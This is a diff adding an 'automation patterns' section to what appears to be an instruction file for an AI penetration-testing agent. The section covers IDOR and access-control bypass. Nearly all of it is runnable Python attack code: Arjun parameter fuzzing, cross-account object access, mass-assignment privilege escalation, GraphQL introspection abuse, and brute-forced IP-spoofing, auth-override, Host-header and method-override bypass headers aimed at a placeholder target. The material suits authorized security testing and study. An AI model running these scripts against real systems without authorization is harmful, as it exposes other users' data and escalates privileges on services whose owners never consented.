@@ -178,6 +178,859 @@ query IDOR {
 - Regulatory risk (GDPR/HIPAA/PCI), fraud, reputational damage
 </impact>
 
+<automation_patterns>
+<title>AUTOMATED PARAMETER DISCOVERY AND IDOR TESTING</title>
+
+<critical>IDOR testing requires automated parameter discovery to find hidden object references and authorization bypass opportunities. Use Arjun for parameter fuzzing and systematic multi-account testing.</critical>
+
+<parameter_discovery>
+**Using Arjun for Parameter Discovery:**
+
+```python
+# Use terminal tool to run Arjun for parameter discovery
+import subprocess
+import json
+
+def discover_parameters_arjun(target_url, method="GET"):
+    """Use Arjun to discover hidden parameters."""
+    
+    # Run Arjun with JSON output
+    cmd = [
+        "arjun",
+        "-u", target_url,
+        "-m", method,
+        "--stable",  # Use stable detection
+        "-oJ", "/workspace/arjun_output.json"  # JSON output
+    ]
+    
+    print(f"[*] Running Arjun on {target_url}...")
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    
+    # Parse results
+    try:
+        with open('/workspace/arjun_output.json', 'r') as f:
+            data = json.load(f)
+            
+        discovered_params = data.get(target_url, [])
+        print(f"[+] Discovered {len(discovered_params)} parameters:")
+        for param in discovered_params:
+            print(f"    - {param}")
+        
+        return discovered_params
+    except Exception as e:
+        print(f"[-] Error parsing Arjun output: {e}")
+        return []
+
+# Execute parameter discovery
+params = discover_parameters_arjun("https://target.com/api/user/profile", "GET")
+```
+
+**Targeted Parameter Fuzzing:**
+```python
+def fuzz_parameters_batch(target_url, wordlist="/usr/share/wordlists/params.txt"):
+    """Batch parameter fuzzing with custom wordlist."""
+    
+    # Common parameter names for IDOR
+    common_params = [
+        "id", "user_id", "userId", "uid", "account_id", "accountId",
+        "order_id", "orderId", "invoice_id", "invoiceId",
+        "file_id", "fileId", "document_id", "documentId",
+        "org_id", "orgId", "organization_id", "tenant_id",
+        "resource_id", "resourceId", "object_id", "objectId",
+        "target_id", "targetId", "owner_id", "ownerId"
+    ]
+    
+    # Write custom wordlist
+    with open('/workspace/idor_params.txt', 'w') as f:
+        for param in common_params:
+            f.write(f"{param}\n")
+    
+    # Run Arjun with custom wordlist
+    cmd = [
+        "arjun",
+        "-u", target_url,
+        "-w", "/workspace/idor_params.txt",
+        "-t", "10",  # 10 threads
+        "--passive",  # Passive detection
+        "-oJ", "/workspace/arjun_idor.json"
+    ]
+    
+    subprocess.run(cmd, capture_output=True)
+    
+    # Parse and return results
+    with open('/workspace/arjun_idor.json', 'r') as f:
+        return json.load(f)
+
+# Execute
+fuzz_parameters_batch("https://target.com/api/users")
+```
+</parameter_discovery>
+
+<unauthorized_access_testing>
+**Automated Multi-Account IDOR Testing:**
+
+```python
+# Use python tool for systematic IDOR testing
+import requests
+
+def test_idor_systematic(base_url, discovered_params, accounts):
+    """
+    Systematic IDOR testing with multiple accounts.
+    
+    Args:
+        base_url: Target endpoint
+        discovered_params: Parameters from Arjun
+        accounts: List of {session, user_id, role} dicts
+    """
+    
+    findings = []
+    
+    # Step 1: Collect valid object IDs per account
+    object_ids = {}
+    for account in accounts:
+        session = requests.Session()
+        session.headers.update({"Authorization": f"Bearer {account['session']}"})
+        
+        # Get user's own resources
+        resp = session.get(f"{base_url}/list")
+        if resp.status_code == 200:
+            data = resp.json()
+            # Extract IDs (adjust based on API structure)
+            ids = [item.get('id') for item in data.get('items', [])]
+            object_ids[account['user_id']] = ids
+            print(f"[+] Account {account['user_id']}: {len(ids)} objects")
+    
+    # Step 2: Test cross-account access
+    for victim_id, victim_objects in object_ids.items():
+        for attacker in accounts:
+            if attacker['user_id'] == victim_id:
+                continue  # Skip self-access
+            
+            attacker_session = requests.Session()
+            attacker_session.headers.update({
+                "Authorization": f"Bearer {attacker['session']}"
+            })
+            
+            # Test each discovered parameter
+            for param in discovered_params:
+                for victim_object_id in victim_objects[:5]:  # Test first 5
+                    # Test GET
+                    resp = attacker_session.get(
+                        base_url,
+                        params={param: victim_object_id}
+                    )
+                    
+                    if resp.status_code == 200:
+                        print(f"[!] IDOR FOUND: {attacker['user_id']} → {victim_id}")
+                        print(f"    Parameter: {param}={victim_object_id}")
+                        print(f"    Response: {resp.text[:200]}")
+                        
+                        findings.append({
+                            "attacker": attacker['user_id'],
+                            "victim": victim_id,
+                            "parameter": param,
+                            "object_id": victim_object_id,
+                            "method": "GET",
+                            "status": resp.status_code
+                        })
+    
+    return findings
+
+# Execute with test accounts
+accounts = [
+    {"user_id": "user_1", "session": "token_1", "role": "user"},
+    {"user_id": "user_2", "session": "token_2", "role": "user"},
+    {"user_id": "admin_1", "session": "admin_token", "role": "admin"}
+]
+
+discovered_params = ["id", "user_id", "resource_id"]
+findings = test_idor_systematic(
+    "https://target.com/api/resource",
+    discovered_params,
+    accounts
+)
+
+print(f"\n[*] Found {len(findings)} IDOR vulnerabilities")
+```
+</unauthorized_access_testing>
+
+<hidden_parameter_detection>
+**Testing Hidden Parameters for Authorization Bypass:**
+
+```python
+def test_hidden_params_bypass(target_url, discovered_params):
+    """Test if hidden parameters bypass authorization."""
+    
+    # Common bypass parameters
+    bypass_params = {
+        "admin": ["true", "1", "yes"],
+        "is_admin": ["true", "1", "yes"],
+        "role": ["admin", "administrator", "superuser"],
+        "privilege": ["admin", "elevated", "high"],
+        "access_level": ["admin", "full", "unlimited"],
+        "debug": ["true", "1", "yes"],
+        "test": ["true", "1", "yes"],
+        "internal": ["true", "1", "yes"]
+    }
+    
+    # Combine discovered params with bypass params
+    all_params = discovered_params + list(bypass_params.keys())
+    
+    for param in all_params:
+        if param in bypass_params:
+            values = bypass_params[param]
+        else:
+            values = ["true", "1", "admin"]
+        
+        for value in values:
+            try:
+                # Test without auth
+                resp = requests.get(
+                    target_url,
+                    params={param: value},
+                    timeout=5
+                )
+                
+                # Check for successful bypass indicators
+                if resp.status_code == 200:
+                    indicators = [
+                        "admin", "dashboard", "users", "settings",
+                        "configuration", "privileged", "internal"
+                    ]
+                    
+                    if any(ind in resp.text.lower() for ind in indicators):
+                        print(f"[!] BYPASS via {param}={value}")
+                        print(f"    Status: {resp.status_code}")
+                        print(f"    Response: {resp.text[:200]}")
+                        
+            except Exception as e:
+                pass
+
+# Execute
+discovered = discover_parameters_arjun("https://target.com/api/admin", "GET")
+test_hidden_params_bypass("https://target.com/api/admin", discovered)
+```
+
+**Mass Assignment Testing:**
+```python
+def test_mass_assignment(target_url, session_token):
+    """Test for mass assignment vulnerabilities."""
+    
+    # Common privilege escalation fields
+    escalation_fields = {
+        "role": "admin",
+        "is_admin": True,
+        "admin": True,
+        "privilege": "admin",
+        "access_level": "admin",
+        "permissions": ["admin", "all"],
+        "groups": ["admin", "administrators"],
+        "is_staff": True,
+        "is_superuser": True
+    }
+    
+    session = requests.Session()
+    session.headers.update({
+        "Authorization": f"Bearer {session_token}",
+        "Content-Type": "application/json"
+    })
+    
+    # Test PATCH/PUT with escalation fields
+    for field, value in escalation_fields.items():
+        payload = {field: value}
+        
+        # Try PATCH
+        resp = session.patch(target_url, json=payload)
+        if resp.status_code in [200, 204]:
+            print(f"[!] MASS ASSIGNMENT: {field}={value}")
+            print(f"    Method: PATCH, Status: {resp.status_code}")
+            
+            # Verify escalation
+            verify_resp = session.get(target_url)
+            if verify_resp.status_code == 200:
+                data = verify_resp.json()
+                if data.get(field) == value:
+                    print(f"    [!] CONFIRMED: Privilege escalation successful")
+
+# Execute
+test_mass_assignment("https://target.com/api/user/profile", "user_token")
+```
+</hidden_parameter_detection>
+
+<graphql_parameter_discovery>
+**GraphQL Introspection and IDOR Testing:**
+
+```python
+def discover_graphql_parameters(graphql_endpoint):
+    """Discover GraphQL fields via introspection."""
+    
+    introspection_query = """
+    {
+      __schema {
+        types {
+          name
+          fields {
+            name
+            args {
+              name
+              type {
+                name
+                kind
+              }
+            }
+          }
+        }
+      }
+    }
+    """
+    
+    resp = requests.post(
+        graphql_endpoint,
+        json={"query": introspection_query}
+    )
+    
+    if resp.status_code == 200:
+        schema = resp.json()
+        
+        # Extract ID-like arguments
+        id_params = []
+        for type_def in schema['data']['__schema']['types']:
+            if type_def['fields']:
+                for field in type_def['fields']:
+                    for arg in field.get('args', []):
+                        if 'id' in arg['name'].lower():
+                            id_params.append({
+                                "type": type_def['name'],
+                                "field": field['name'],
+                                "arg": arg['name']
+                            })
+        
+        print(f"[+] Found {len(id_params)} ID parameters in GraphQL schema")
+        return id_params
+    
+    return []
+
+def test_graphql_idor(graphql_endpoint, victim_id, attacker_token):
+    """Test GraphQL IDOR with discovered parameters."""
+    
+    # Discover parameters
+    params = discover_graphql_parameters(graphql_endpoint)
+    
+    for param in params:
+        query = f"""
+        {{
+          {param['field']}({param['arg']}: "{victim_id}") {{
+            id
+            email
+            name
+          }}
+        }}
+        """
+        
+        resp = requests.post(
+            graphql_endpoint,
+            json={"query": query},
+            headers={"Authorization": f"Bearer {attacker_token}"}
+        )
+        
+        if resp.status_code == 200:
+            data = resp.json()
+            if 'data' in data and data['data'].get(param['field']):
+                print(f"[!] GraphQL IDOR: {param['field']}({param['arg']})")
+                print(f"    Data: {data['data'][param['field']]}")
+
+# Execute
+test_graphql_idor(
+    "https://target.com/graphql",
+    "victim_user_id_123",
+    "attacker_token"
+)
+```
+</graphql_parameter_discovery>
+
+<complete_workflow>
+**End-to-End Parameter Discovery and IDOR Testing:**
+
+```python
+#!/usr/bin/env python3
+"""
+Complete IDOR Testing Workflow with Arjun
+Save to /workspace/idor_test.py
+"""
+import subprocess
+import requests
+import json
+
+def main():
+    target_url = "https://target.com/api/user/profile"
+    
+    print("[*] Starting IDOR testing workflow...")
+    
+    # Step 1: Parameter discovery with Arjun
+    print("\n[1] Discovering parameters with Arjun...")
+    discovered_params = discover_parameters_arjun(target_url, "GET")
+    
+    # Step 2: Test hidden parameters for bypass
+    print("\n[2] Testing hidden parameters for bypass...")
+    test_hidden_params_bypass(target_url, discovered_params)
+    
+    # Step 3: Multi-account IDOR testing
+    print("\n[3] Testing cross-account access...")
+    accounts = get_test_accounts()  # Load from config
+    findings = test_idor_systematic(target_url, discovered_params, accounts)
+    
+    # Step 4: Mass assignment testing
+    print("\n[4] Testing mass assignment...")
+    for account in accounts:
+        test_mass_assignment(target_url, account['session'])
+    
+    # Step 5: GraphQL testing (if applicable)
+    if "/graphql" in target_url:
+        print("\n[5] Testing GraphQL IDOR...")
+        test_graphql_idor(target_url, "victim_id", "attacker_token")
+    
+    # Step 6: Generate report
+    print(f"\n[*] IDOR testing complete!")
+    print(f"[*] Found {len(findings)} vulnerabilities")
+    
+    # Save report
+    with open('/workspace/idor_report.json', 'w') as f:
+        json.dump(findings, f, indent=2)
+
+if __name__ == "__main__":
+    main()
+```
+</complete_workflow>
+
+<tool_selection>
+**When to use each tool:**
+
+1. **terminal tool** (PRIMARY for Arjun):
+   - Running Arjun for parameter discovery
+   - Batch parameter fuzzing
+   - Installing Arjun: `pip install arjun`
+
+2. **python tool** (PRIMARY for IDOR testing):
+   - Multi-account testing automation
+   - Mass assignment testing
+   - GraphQL introspection and testing
+   - Systematic cross-account access verification
+
+3. **browser_action tool**:
+   - Testing IDOR in complex UI workflows
+   - Capturing network requests for parameter discovery
+   - Visual confirmation of unauthorized access
+
+4. **web_search tool**:
+   - Finding latest Arjun usage patterns
+   - Researching API-specific parameter naming conventions
+   - Discovering new IDOR techniques
+</tool_selection>
+
+<header_bypass_automation>
+<title>HTTP HEADER BYPASS TECHNIQUES (WHITEPASS-INSPIRED)</title>
+
+<critical>Many applications trust HTTP headers for authorization decisions. Systematic header manipulation can bypass IP restrictions, authentication, and access controls.</critical>
+
+<ip_spoofing_headers>
+**IP Spoofing for Authorization Bypass:**
+
+```python
+# Use python tool for header-based bypass testing
+import requests
+
+def test_ip_spoofing_headers(target_url, session_token=None):
+    """Test IP spoofing headers for authorization bypass."""
+    
+    # Comprehensive IP spoofing header list (whitepass-inspired)
+    ip_headers = {
+        # Standard forwarding headers
+        "X-Forwarded-For": ["127.0.0.1", "localhost", "10.0.0.1", "192.168.1.1"],
+        "X-Real-IP": ["127.0.0.1", "localhost"],
+        "X-Originating-IP": ["127.0.0.1"],
+        "X-Remote-IP": ["127.0.0.1"],
+        "X-Client-IP": ["127.0.0.1"],
+        "X-Remote-Addr": ["127.0.0.1"],
+        
+        # Cloud/proxy headers
+        "CF-Connecting-IP": ["127.0.0.1"],  # Cloudflare
+        "True-Client-IP": ["127.0.0.1"],  # Akamai
+        "X-Cluster-Client-IP": ["127.0.0.1"],
+        
+        # Less common headers
+        "Forwarded-For": ["127.0.0.1"],
+        "Forwarded": ["for=127.0.0.1"],
+        "X-ProxyUser-Ip": ["127.0.0.1"],
+        "Client-IP": ["127.0.0.1"],
+        "Via": ["127.0.0.1"],
+        "X-Host": ["127.0.0.1"],
+        
+        # Multiple IP variations
+        "X-Forwarded-For": [
+            "127.0.0.1",
+            "127.0.0.1, 127.0.0.1",  # Multiple IPs
+            "127.0.0.1, 10.0.0.1",
+            "0.0.0.0",
+            "localhost",
+            "::1",  # IPv6 localhost
+        ]
+    }
+    
+    findings = []
+    
+    for header_name, ip_values in ip_headers.items():
+        for ip_value in ip_values:
+            headers = {header_name: ip_value}
+            
+            if session_token:
+                headers["Authorization"] = f"Bearer {session_token}"
+            
+            try:
+                resp = requests.get(target_url, headers=headers, timeout=5)
+                
+                # Check for successful bypass
+                if resp.status_code == 200:
+                    # Look for admin/internal indicators
+                    indicators = ["admin", "internal", "dashboard", "privileged"]
+                    if any(ind in resp.text.lower() for ind in indicators):
+                        print(f"[!] BYPASS via {header_name}: {ip_value}")
+                        print(f"    Status: {resp.status_code}")
+                        findings.append({
+                            "header": header_name,
+                            "value": ip_value,
+                            "status": resp.status_code
+                        })
+                        
+            except Exception as e:
+                pass
+    
+    return findings
+
+# Execute
+findings = test_ip_spoofing_headers("https://target.com/admin/users")
+print(f"[*] Found {len(findings)} header bypasses")
+```
+</ip_spoofing_headers>
+
+<authentication_bypass_headers>
+**Authentication Bypass Headers:**
+
+```python
+def test_auth_bypass_headers(target_url):
+    """Test authentication bypass via custom headers."""
+    
+    # Authentication bypass headers (whitepass database)
+    auth_headers = {
+        # User identification headers
+        "X-User-ID": ["1", "admin", "0"],
+        "X-User": ["admin", "administrator", "root"],
+        "X-Username": ["admin", "administrator"],
+        "X-Auth-User": ["admin"],
+        
+        # Role/privilege headers
+        "X-Role": ["admin", "administrator", "superuser"],
+        "X-Privilege": ["admin", "elevated"],
+        "X-Admin": ["true", "1", "yes"],
+        "X-Is-Admin": ["true", "1"],
+        
+        # Internal/debug headers
+        "X-Internal": ["true", "1"],
+        "X-Debug": ["true", "1"],
+        "X-Test": ["true", "1"],
+        "X-Development": ["true", "1"],
+        
+        # Custom authorization headers
+        "X-Custom-IP-Authorization": ["127.0.0.1"],
+        "X-Authorized": ["true", "1"],
+        "X-Access": ["granted", "allowed"],
+        
+        # Organization/tenant headers
+        "X-Organization-ID": ["1", "admin"],
+        "X-Tenant-ID": ["1", "admin"],
+        "X-Account-ID": ["1", "admin"],
+        
+        # Rewrite/override headers
+        "X-Original-URL": ["/admin", "/internal"],
+        "X-Rewrite-URL": ["/admin", "/internal"],
+        "X-Override-URL": ["/admin"],
+    }
+    
+    for header_name, values in auth_headers.items():
+        for value in values:
+            try:
+                resp = requests.get(
+                    target_url,
+                    headers={header_name: value},
+                    timeout=5
+                )
+                
+                if resp.status_code == 200:
+                    print(f"[!] AUTH BYPASS: {header_name}={value}")
+                    print(f"    Response: {resp.text[:200]}")
+                    
+            except Exception as e:
+                pass
+
+# Execute
+test_auth_bypass_headers("https://target.com/api/admin/settings")
+```
+</authentication_bypass_headers>
+
+<host_header_manipulation>
+**Host Header Manipulation:**
+
+```python
+def test_host_header_bypass(target_url):
+    """Test Host header manipulation for access control bypass."""
+    
+    from urllib.parse import urlparse
+    
+    parsed = urlparse(target_url)
+    
+    # Host header variations
+    host_variations = [
+        "localhost",
+        "127.0.0.1",
+        "0.0.0.0",
+        "internal.company.com",
+        "admin.company.com",
+        f"{parsed.netloc}.localhost",
+        f"localhost.{parsed.netloc}",
+        f"{parsed.netloc}@localhost",  # Userinfo confusion
+    ]
+    
+    for host_value in host_variations:
+        try:
+            resp = requests.get(
+                target_url,
+                headers={"Host": host_value},
+                timeout=5
+            )
+            
+            if resp.status_code == 200:
+                print(f"[!] HOST BYPASS: Host={host_value}")
+                print(f"    Status: {resp.status_code}")
+                
+        except Exception as e:
+            pass
+
+# Execute
+test_host_header_bypass("https://target.com/admin")
+```
+</host_header_manipulation>
+
+<combined_header_fuzzing>
+**Combined Header Fuzzing (Whitepass-style):**
+
+```python
+def fuzz_headers_combined(target_url, victim_resource_id):
+    """
+    Combined header fuzzing for IDOR bypass.
+    Tests combinations of IP spoofing + auth headers.
+    """
+    
+    # Base header combinations
+    header_combos = [
+        # IP spoofing + user override
+        {
+            "X-Forwarded-For": "127.0.0.1",
+            "X-User-ID": "1"
+        },
+        {
+            "X-Real-IP": "127.0.0.1",
+            "X-Role": "admin"
+        },
+        {
+            "X-Originating-IP": "10.0.0.1",
+            "X-Admin": "true"
+        },
+        
+        # Internal access simulation
+        {
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Internal": "true",
+            "X-Debug": "true"
+        },
+        
+        # Tenant/org override
+        {
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Organization-ID": "1",
+            "X-Tenant-ID": "admin"
+        },
+        
+        # URL rewrite + IP spoofing
+        {
+            "X-Forwarded-For": "127.0.0.1",
+            "X-Original-URL": f"/admin/resource/{victim_resource_id}",
+            "X-Rewrite-URL": f"/admin/resource/{victim_resource_id}"
+        },
+    ]
+    
+    for headers in header_combos:
+        try:
+            resp = requests.get(
+                f"{target_url}?id={victim_resource_id}",
+                headers=headers,
+                timeout=5
+            )
+            
+            if resp.status_code == 200:
+                print(f"[!] COMBINED BYPASS:")
+                for k, v in headers.items():
+                    print(f"    {k}: {v}")
+                print(f"    Status: {resp.status_code}")
+                print(f"    Response: {resp.text[:200]}")
+                
+        except Exception as e:
+            pass
+
+# Execute
+fuzz_headers_combined(
+    "https://target.com/api/resource",
+    "victim_resource_123"
+)
+```
+</combined_header_fuzzing>
+
+<method_override_bypass>
+**HTTP Method Override:**
+
+```python
+def test_method_override(target_url, resource_id):
+    """Test HTTP method override headers for access control bypass."""
+    
+    # Method override headers
+    override_headers = [
+        "X-HTTP-Method-Override",
+        "X-HTTP-Method",
+        "X-Method-Override",
+        "_method"
+    ]
+    
+    # Try to override GET to DELETE/PUT/PATCH
+    methods = ["DELETE", "PUT", "PATCH", "POST"]
+    
+    for override_header in override_headers:
+        for method in methods:
+            try:
+                # Send GET with method override
+                resp = requests.get(
+                    f"{target_url}/{resource_id}",
+                    headers={override_header: method},
+                    timeout=5
+                )
+                
+                if resp.status_code in [200, 204]:
+                    print(f"[!] METHOD OVERRIDE: {override_header}={method}")
+                    print(f"    Status: {resp.status_code}")
+                    
+            except Exception as e:
+                pass
+
+# Execute
+test_method_override("https://target.com/api/resource", "123")
+```
+</method_override_bypass>
+
+<complete_header_bypass_workflow>
+**End-to-End Header Bypass Testing:**
+
+```python
+#!/usr/bin/env python3
+"""
+Complete Header Bypass Testing Workflow
+Inspired by whitepass header bypass database
+Save to /workspace/header_bypass_test.py
+"""
+import requests
+import itertools
+
+def main():
+    target_url = "https://target.com/api/admin/users"
+    victim_resource_id = "victim_user_123"
+    
+    print("[*] Starting header bypass testing...")
+    
+    # Step 1: IP spoofing headers
+    print("\n[1] Testing IP spoofing headers...")
+    ip_findings = test_ip_spoofing_headers(target_url)
+    
+    # Step 2: Authentication bypass headers
+    print("\n[2] Testing authentication bypass headers...")
+    test_auth_bypass_headers(target_url)
+    
+    # Step 3: Host header manipulation
+    print("\n[3] Testing Host header manipulation...")
+    test_host_header_bypass(target_url)
+    
+    # Step 4: Combined header fuzzing
+    print("\n[4] Testing combined header bypasses...")
+    fuzz_headers_combined(target_url, victim_resource_id)
+    
+    # Step 5: Method override
+    print("\n[5] Testing HTTP method override...")
+    test_method_override(target_url, victim_resource_id)
+    
+    # Step 6: Brute force all combinations (advanced)
+    print("\n[6] Brute forcing header combinations...")
+    brute_force_headers(target_url)
+    
+    print(f"\n[*] Header bypass testing complete!")
+
+def brute_force_headers(target_url):
+    """Brute force all possible header combinations."""
+    
+    # Key headers to test
+    headers_to_test = {
+        "X-Forwarded-For": ["127.0.0.1", "localhost"],
+        "X-User-ID": ["1", "admin"],
+        "X-Role": ["admin"],
+        "X-Admin": ["true"],
+    }
+    
+    # Generate all combinations
+    keys = list(headers_to_test.keys())
+    values = [headers_to_test[k] for k in keys]
+    
+    for combo in itertools.product(*values):
+        headers = dict(zip(keys, combo))
+        
+        try:
+            resp = requests.get(target_url, headers=headers, timeout=3)
+            if resp.status_code == 200:
+                print(f"[!] COMBO BYPASS: {headers}")
+        except:
+            pass
+
+if __name__ == "__main__":
+    main()
+```
+</complete_header_bypass_workflow>
+
+<tool_selection>
+**When to use each tool:**
+
+1. **python tool** (PRIMARY for header bypass):
+   - Automated header fuzzing
+   - Combined header testing
+   - Systematic bypass enumeration
+
+2. **terminal tool**:
+   - Running curl with custom headers for quick tests
+   - Using specialized tools if available
+
+3. **browser_action tool**:
+   - Testing header bypass in complex workflows
+   - Capturing network requests with modified headers
+
+4. **web_search tool**:
+   - Finding latest header bypass techniques
+   - Researching application-specific header handling
+</tool_selection>
+</header_bypass_automation>
+</automation_patterns>
+
 <pro_tips>
 1. Always test list/search/export endpoints first; they are rich ID seeders.
 2. Build a reusable ID corpus from logs, notifications, emails, and client bundles.
